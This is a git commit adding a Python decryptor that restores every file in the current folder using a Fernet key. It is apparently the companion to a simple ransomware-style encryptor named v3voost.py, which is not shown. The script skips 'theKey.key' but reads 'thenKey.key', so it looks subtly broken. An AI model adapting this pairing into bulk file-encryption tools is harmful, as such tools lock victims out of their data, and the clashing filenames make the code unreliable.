5524f45b3b87b430dc132bef47806713de07a154
skullsThd <104901809+skullsThd@users.noreply.github.com>
2023-06-11 11:29:43 +0200

    Add files via upload

---
+++ decrypt.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+
+import os 
+from cryptography.fernet import Fernet
+
+#let's find some files
+
+
+files = []
+
+for file in os.listdir():
+       if file == "v3voost.py" or file == "theKey.key" or file == "decrypt.py":
+              continue 
+       if  os.path.isfile(file):
+             files.append(file)
+
+with open("thenKey.key", "rb") as key:
+        secretkey = key.read()
+
+print(files)
+
+for file in files:
+         with open(file, "rb") as thefile:
+                  contents = thefile.read()
+                  contents_decrypted = Fernet(secretkey).decrypt(contents)
+                  with open(file, "wb") as thefile:
+                         thefile.write(contents_decrypted)
